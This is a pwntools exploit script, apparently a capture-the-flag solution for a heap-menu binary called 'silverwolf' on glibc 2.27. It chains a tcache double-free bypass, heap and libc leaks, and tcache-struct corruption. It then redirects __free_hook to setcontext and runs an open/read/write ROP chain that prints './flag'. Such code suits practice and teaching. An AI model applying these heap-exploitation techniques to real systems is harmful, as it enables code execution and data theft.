from pwn import *
context(log_level='debug',arch='amd64',terminal=['tmux','splitw','-h'])

# io=remote("node4.anna.nssctf.cn",28802)
io=process("./silverwolf")
elf=ELF("./silverwolf")
libc=ELF("./libc-2.27.so")

def add(s):
    io.sendlineafter(b"choice: ",b"1")
    io.sendlineafter(b"Index: ",b"0")
    io.sendlineafter(b"Size: ",str(s))
    
def edit(cc):
    io.sendlineafter(b"choice: ",b"2")
    io.sendlineafter(b"Index: ",b"0")
    io.sendlineafter(b"Content: ",cc)

def show(n):
    io.sendlineafter(b"choice: ",b"3")
    io.sendlineafter(b"Index: ",str(n))
    
def delete(n):
    io.sendlineafter(b"choice: ",b"4")
    io.sendlineafter(b"Index: ",str(n))

def rst():
    for i in range(12):
        add(0x10)
    for i in range(11):
        add(0x60)
    for i in range(7):
        add(0x70)
    add(0x50)
    

rst()  #开启seccomp后堆风水乱掉，尽可能恢复
add(0x78)
delete(0)
edit(p64(0)*2) #绕过tcache double free检测
delete(0)
show(0)  #泄露堆地址，为后续srop做准备
io.recvuntil(b"Content: ")
heap_addr=u64(io.recv(6).ljust(8,b"\x00"))-0x1920
print("heap_addr: "+hex(heap_addr))
edit(p64(heap_addr+0x10))
add(0x78)  
add(0x78)  #申请到heap_addr+0x10处修改counts
edit(p64(0)*0x4+p64(0x7000000)+p64(0)*3) #tcache struct attack

delete(0)
show(0)  #泄露libc
leak_addr=u64(io.recvuntil(b"\x7f")[-6:].ljust(8,b"\x00"))-0x70-libc.sym[b"__malloc_hook"]
print("leak_addr: "+hex(leak_addr))
malloc_hook=libc.sym[b"__malloc_hook"]+leak_addr
free_hook=libc.sym[b"__free_hook"]+leak_addr
setcontext=libc.sym[b"setcontext"]+leak_addr+53 #mov rsp,[rdi+0A0h]
sys_addr=libc.sym[b"system"]+leak_addr
open_addr=libc.sym[b"open"]+leak_addr
read_addr=libc.sym[b"read"]+leak_addr
write_addr=libc.sym[b"write"]+leak_addr
flag_addr=heap_addr+0x1000

#gadgets
pop_rdi=0x215bf+leak_addr
pop_rsi=0x23eea+leak_addr
pop_rdx=0x01b96+leak_addr
pop_rcx=0x34da3+leak_addr
pop_rax=0x43ae8+leak_addr 
pop_rsp=0x03960+leak_addr
syscall=0xd2745+leak_addr 
ret=0x08aa+leak_addr

# edit((p64(0)+p64(1))*4)


payload=b"\x02"*0x40+p64(free_hook) #对应tcachebin 大小 0x18
payload+=p64(0) #0x28
payload+=p64(heap_addr+0x1000) #flag   0x38 flag字符串地址
payload+=p64(heap_addr+0x2000) #stack   0x48  最后delete触发free_hook的tcachebin
payload+=p64(heap_addr+0x20a0) #stack   0x58 写入迁移到orw rop的tcachebin处
payload+=p64(heap_addr+0x4000) #orw rop  0x68 
payload+=p64(heap_addr+0x4068) #orw rop  0x78
edit(payload)


#open
orw=p64(pop_rdi)+p64(flag_addr)+p64(pop_rsi)+p64(0)+p64(pop_rax)+p64(2)+p64(syscall)
#read
orw+=p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(heap_addr+0x5000)+p64(pop_rdx)+p64(0x50)+p64(read_addr)
#write
orw+=p64(pop_rdi)+p64(1)+p64(pop_rsi)+p64(heap_addr+0x5000)+p64(pop_rdx)+p64(0x50)+p64(write_addr)


gdb.attach(io)
pause()


add(0x18)
edit(p64(setcontext)) #将free_hook指向setcontext+0x53处，避开fldenv指令

add(0x38)
edit(b"./flag")

add(0x68)
edit(orw[:0x68])

add(0x78)
edit(orw[0x68:])

add(0x58)
edit(p64(heap_addr+0x4000)+p64(ret))

add(0x48)
delete(0)

# add(0x58)
# add(0x48)
# delete(n)
# payload+=
# add(0x40)
# for i in range(4):
#     add(0x10)
# edit(b"flag\x00\x00\x00")

# edit(p64(0)*8)
# edit(p64(free_hook))
# add(0x10)

io.interactive()